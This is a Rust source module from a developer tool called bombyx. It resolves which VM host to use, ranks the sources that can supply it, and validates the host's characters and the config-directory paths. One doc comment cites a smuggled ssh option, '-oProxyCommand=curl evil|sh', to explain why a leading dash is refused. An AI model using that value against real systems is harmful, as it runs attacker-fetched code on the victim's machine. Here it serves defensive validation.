//! Where the VM host name comes from, and what shape it may take.
//!
//! The host is the one setting that is deliberately **not** in the
//! project file: it belongs to whoever drives bombyx, not to the
//! repo. So it has four possible sources with a ranking between
//! them, a charset rule and a provenance answer -- a
//! self-contained subject, which is why it is a module of its own
//! rather than part of parsing `bombyx.toml`.
//!
//! The two lowest-ranked sources are keys in one file, and
//! `super::registry` is what reads it. This module asks that
//! module for the file, then for the named project's own `host`
//! and the file-wide one, in that order. A project keeping to
//! its own machine is what the per-project key is for.
//!
//! What is wrong with a host value is decided in one place,
//! [`host_problem`], and reported two ways: as a *field* problem
//! by `super::Config::validate`, and as a problem with a *source*
//! by [`super::Config::load`], which names `--host` or the file
//! the value came from. Deciding it once is what keeps the two
//! messages from drifting apart.

use std::path::{Path, PathBuf};

use super::error::FieldError;
use super::registry::{self, USER_CONFIG_FILE};
use super::{ConfigError, guards};
use crate::name::ProjectName;

/// Characters allowed in an SSH destination.
///
/// Deliberately narrow: an alias from `~/.ssh/config`, or a
/// `user@host` spelling.
pub(crate) fn is_host_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@')
}

/// Environment variable naming the VM host directly.
pub const HOST_ENV: &str = "BOMBYX_HOST";

/// Environment variable relocating the per-developer config
/// directory.
///
/// Exists so a test -- or an operator keeping several setups
/// apart -- can point bombyx at a directory of its own instead
/// of the real one.
pub const CONFIG_DIR_ENV: &str = "BOMBYX_CONFIG_HOME";

/// Where a VM host name may come from, highest precedence
/// first.
///
/// The binary fills this in from its command line and
/// environment; tests construct it directly, which is why the
/// environment is a field rather than something read in place.
#[derive(Debug, Clone, Default)]
pub struct HostSources<'a> {
    /// `--host`, for a one-off run against another machine.
    pub flag: Option<&'a str>,

    /// The [`HOST_ENV`] environment variable.
    pub env: Option<&'a str>,

    /// Which project's entry to consult, when the caller knows.
    ///
    /// The entry lives in the same file as the file-wide `host`
    /// and outranks it, so one project can run on a machine of
    /// its own. `None` skips that source entirely, which is what
    /// every command does until `--project` exists.
    ///
    /// A `&str` rather than a [`ProjectName`]: a name of any
    /// shape simply matches no table key, and the caller is not
    /// asking for the entry, so there is nothing here to refuse.
    /// `super::registry::Registry::project` is what checks a
    /// requested name, once, when the entry itself is wanted.
    pub project: Option<&'a str>,

    /// Directory holding [`USER_CONFIG_FILE`], usually from
    /// [`user_config_dir`].
    pub user_config_dir: Option<&'a Path>,
}

/// What is wrong with a host value.
///
/// This type deliberately carries no field name.
/// [`FieldError`] does carry one, and for every other config
/// value that name answers the operator's question, "which key
/// do I edit?". For `host` it does not, because the value may
/// have come from `--host`, from an environment variable, or
/// from the per-developer `config.toml`. The useful answer is the
/// *source*, which [`super::Config::load`] knows and attaches.
pub(crate) enum HostProblem {
    /// Blank, so no host at all.
    Empty,
    /// Present but outside the allowed shape.
    Invalid(String),
}

impl From<FieldError> for HostProblem {
    /// Drops the field name the guards attach.
    ///
    /// Every guard is written to name a field, because most
    /// callers want that. `host` is the exception, so the name
    /// is discarded here and the caller supplies the source
    /// instead.
    fn from(err: FieldError) -> Self {
        match err {
            FieldError::Empty { .. } => Self::Empty,
            FieldError::Invalid { reason, .. } => Self::Invalid(reason),
        }
    }
}

/// Checks a host value, whatever supplied it.
///
/// It applies three rules, and all three come from
/// `super::guards`, so widening one there widens it here too.
///
/// The leading-dash rule is the one worth spelling out. `host`
/// reaches `ssh` as its first positional argument, and `ssh`
/// does not honour a `--` end-of-options separator, so a
/// leading `-` is read as an option:
/// `-oProxyCommand=curl evil|sh` runs code on this workstation
/// from a bare `bombyx status`, before any network traffic.
pub(crate) fn host_problem(value: &str) -> Option<HostProblem> {
    guards::check_not_empty("host", value)
        .and_then(|()| guards::check_not_an_option("host", value, "ssh"))
        .and_then(|()| {
            guards::check_charset(
                "host",
                value,
                is_host_char,
                "letters, digits, `.`, `_`, `-` or `@`",
            )
        })
        .err()
        .map(HostProblem::from)
}

/// Whether an environment-supplied directory is safe to use.
///
/// Requires an anchored path: a POSIX root, a Windows root, or a
/// drive *with* a separator. Rooted spellings are checked
/// directly rather than through [`Path::is_absolute`], which
/// answers per-platform -- `C:\x` is not absolute on Unix and
/// `/x` is not absolute on Windows, while this same code reads
/// the same environment on both.
///
/// `C:cfg` is refused along with `cfg`: a drive-relative path
/// resolves against that drive's current directory, which is not
/// a location the operator chose either.
pub fn is_anchored_dir(value: &str) -> bool {
    let value = value.trim();
    if value.starts_with('/') || value.starts_with('\\') {
        return true;
    }
    let bytes = value.as_bytes();
    bytes.len() >= 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && (bytes[2] == b'/' || bytes[2] == b'\\')
}

/// Returns the directory holding the per-developer config.
///
/// [`CONFIG_DIR_ENV`] wins when set. Otherwise this is
/// `%APPDATA%\bombyx` on Windows and
/// `$XDG_CONFIG_HOME/bombyx` -- or `$HOME/.config/bombyx` --
/// elsewhere. `None` when the environment names no home at
/// all, which is a machine bombyx cannot guess about.
///
/// Every value must be an *anchored* path; a blank or relative
/// one counts as unset and the next source is consulted. A
/// relative value would otherwise resolve against the working
/// directory, which on this tool means taking the VM host out of
/// whatever repo bombyx was run in.
#[must_use]
pub fn user_config_dir() -> Option<PathBuf> {
    config_dir_from(|key| std::env::var(key).ok(), cfg!(windows))
}

/// [`user_config_dir`] against an arbitrary environment.
///
/// `var` is split out so the precedence is testable without
/// mutating the process environment, which is global and would
/// make these tests race each other. `windows` is split out for
/// the same reason and gates `APPDATA`.
///
/// **`APPDATA` is consulted only when `windows`.** It is
/// routinely set in processes that are not Windows -- under WSL
/// via `WSLENV`, under Wine, in some CI images. Checking it
/// unconditionally would make a Linux run read a *Windows*
/// config directory in preference to `$HOME/.config`, silently
/// taking the host name from a file the docs say applies only to
/// Windows.
pub(crate) fn config_dir_from<F>(var: F, windows: bool) -> Option<PathBuf>
where
    F: Fn(&str) -> Option<String>,
{
    // A value that is blank *or not anchored* is treated as
    // unset, and the next source is consulted.
    //
    // Both spellings do the same damage. Set to "" by a launcher
    // script, the variable resolves to a relative
    // `bombyx/config.toml` in the working directory; set to a
    // non-blank relative value it resolves just as relatively --
    // `BOMBYX_CONFIG_HOME=.` reads `./config.toml`,
    // `XDG_CONFIG_HOME=.config` reads
    // `./.config/bombyx/config.toml`, and `..` walks out of the
    // tree. Either way the host name comes out of the repo,
    // which is the one thing this design removes.
    //
    // Such a value arrives from a per-directory environment
    // (`direnv`, a `mise.toml` in a clone, a CI job) or a plain
    // typo, and the host it supplies decides where `up` boots a
    // VM and where `destroy` runs `rm -rf`.
    let set = |key: &str| {
        var(key)
            .filter(|v| is_anchored_dir(v))
            .map(|v| v.trim().to_owned())
    };

    if let Some(dir) = set(CONFIG_DIR_ENV) {
        return Some(PathBuf::from(dir));
    }
    if windows {
        return set("APPDATA")
            .map(|appdata| Path::new(&appdata).join("bombyx"));
    }
    if let Some(xdg) = set("XDG_CONFIG_HOME") {
        return Some(Path::new(&xdg).join("bombyx"));
    }
    let home = set("HOME")?;
    Some(Path::new(&home).join(".config").join("bombyx"))
}

/// Which source supplied [`super::Config::host`].
///
/// Returned by [`super::Config::load`] so a caller can *report*
/// the winner instead of re-deriving it. A binary that re-tested
/// the flag and the environment for itself would hold a second
/// copy of the precedence rule below, in code no library test can
/// reach -- so reordering the sources here would leave its
/// message naming the wrong one.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HostOrigin {
    /// The `--host` flag.
    Flag,
    /// The [`HOST_ENV`] environment variable.
    Env,
    /// One project's entry in the per-developer
    /// [`USER_CONFIG_FILE`].
    ///
    /// It carries the project name because the entry and the
    /// file-wide `host` sit in the same file: naming the file
    /// alone would leave the operator to work out which of the
    /// two won, and `destroy` runs `rm -rf` on the winner. The
    /// name is the map key as the file spells it, so it is the
    /// table heading to go and edit.
    ///
    /// Carrying it is why [`HostOrigin`] is not `Copy`.
    ProjectEntry(ProjectName),
    /// The file-wide `host` in the per-developer
    /// [`USER_CONFIG_FILE`].
    UserFile,
}

impl HostOrigin {
    /// Names this source, in the words both callers print.
    ///
    /// `file` is the registry's path when the caller knows it,
    /// and the bare file name otherwise. `super::Config::load`
    /// knows it and passes it, because an operator sent to fix a
    /// bad value has to find the file; the notice on every run
    /// does not, because the path is the same one every time and
    /// would be noise.
    ///
    /// One function rather than two, so the notice and the error
    /// cannot come to describe the same source differently. The
    /// wording for a project entry names its table, and that
    /// spelling existing twice is how the two drift apart.
    pub(crate) fn describe(&self, file: Option<&str>) -> String {
        let file = file.unwrap_or(USER_CONFIG_FILE);
        match self {
            Self::Flag => "--host".to_owned(),
            Self::Env => HOST_ENV.to_owned(),
            Self::ProjectEntry(name) => {
                format!("[projects.{name}].host in {file}")
            }
            Self::UserFile => file.to_owned(),
        }
    }
}

impl std::fmt::Display for HostOrigin {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.describe(None))
    }
}

/// Finds the VM host, highest-precedence source first.
///
/// Four sources, in order: `--host`, [`HOST_ENV`], the named
/// project's own `host` key, and the file-wide `host`. The last
/// two share one file, and the entry wins so that one project
/// can run on a machine of its own.
///
/// The per-developer file is read *last* and only if it is
/// needed, so `--host` works on a machine whose file is absent
/// or broken.
///
/// A blank [`HOST_ENV`] counts as unset. An exported-but-empty
/// variable is how a shell says "no value", and reporting "no
/// VM host configured" is more use than an empty-field error.
/// A host supplied directly by the caller is *not* treated that
/// way: it was asked for, so the empty-value error identifies it.
pub(crate) fn resolve_host(
    sources: &HostSources,
) -> Result<(String, HostOrigin), ConfigError> {
    if let Some(host) = sources.flag {
        return Ok((host.to_owned(), HostOrigin::Flag));
    }
    if let Some(host) = sources.env.filter(|v| !v.trim().is_empty()) {
        return Ok((host.to_owned(), HostOrigin::Env));
    }
    // The file is read once and both of its sources are taken
    // from that one copy. Reading it twice would let a file
    // edited between the two reads supply a project host and a
    // file-wide host that never coexisted.
    if let Some(dir) = sources.user_config_dir
        && let Some(registry) = registry::Registry::read(dir)?
    {
        if let Some(name) = sources.project
            && let Some((key, host)) = registry.project_host(name)
        {
            return Ok((
                host.to_owned(),
                HostOrigin::ProjectEntry(key.clone()),
            ));
        }
        if let Some(host) = registry.host() {
            return Ok((host.to_owned(), HostOrigin::UserFile));
        }
    }
    Err(ConfigError::HostMissing {
        place: host_place(sources),
    })
}

/// Names the one file that can carry a host, for an error
/// message.
///
/// It is a path the operator can act on, so it is printed in
/// full rather than described.
pub(crate) fn host_place(sources: &HostSources) -> String {
    match sources.user_config_dir.map(registry::path) {
        Some(user) => user.display().to_string(),
        // No home directory in the environment, so there is
        // nothing concrete to point at.
        None => format!("a {USER_CONFIG_FILE} in your config directory"),
    }
}
